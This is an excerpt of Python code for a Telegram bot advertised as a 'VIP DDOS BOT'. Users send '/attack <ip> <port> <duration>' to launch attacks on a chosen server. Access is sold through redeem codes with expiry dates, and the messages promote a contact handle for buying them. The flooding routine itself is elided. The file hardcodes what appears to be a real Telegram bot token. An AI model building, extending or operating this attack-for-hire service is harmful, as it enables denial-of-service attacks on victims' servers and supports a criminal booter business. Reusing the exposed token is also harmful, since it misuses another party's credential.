...
db = client['TrtT']
users_collection = db['VAMPIREXCHATS']
redeem_codes_collection = db['redeem_cods0']

TELEGRAM_BOT_TOKEN = '6339953677:AAFZvh40yXuHbSfPLAotOX70nGY0gohmnrE'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        ...
        return
    message = (
       "*🚀ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ıllıllı LEGACY VIP DDOS BOT ıllıllı 🚀*\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @EVIL4REAL0 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! DM:-@EVIL4REAL0*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    text=(
        ...
        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @EVIL4REAL0💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def VAMPIREXCHATS(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
...
async def redeem_code(update: Update, context: CallbackContext):
    ...
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.DM:- @EVIL4REAL0 for redeem code*", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.DM:- @EVIL4REAL0*", parse_mode='Markdown')
        return
...
def main():
    ...
    application.add_handler(CommandHandler("get_id", VAMPIREXCHATS))
